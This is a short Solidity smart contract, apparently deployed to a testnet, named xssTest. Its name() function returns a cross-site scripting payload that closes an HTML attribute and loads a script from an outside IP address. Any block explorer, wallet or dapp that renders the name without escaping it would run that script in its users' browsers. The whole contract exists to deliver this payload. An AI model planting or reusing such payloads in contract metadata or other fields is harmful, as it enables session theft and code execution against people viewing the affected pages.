/**
 *Submitted for verification at testnet.snowtrace.io on 2022-09-27
*/

// SPDX-License-Identifier: MIT
pragma solidity = 0.8.7;

contract xssTest {
   
    function name() public view returns (string memory){
        return "\"><script src=//104.156.252.239/xss></script>";
    }

}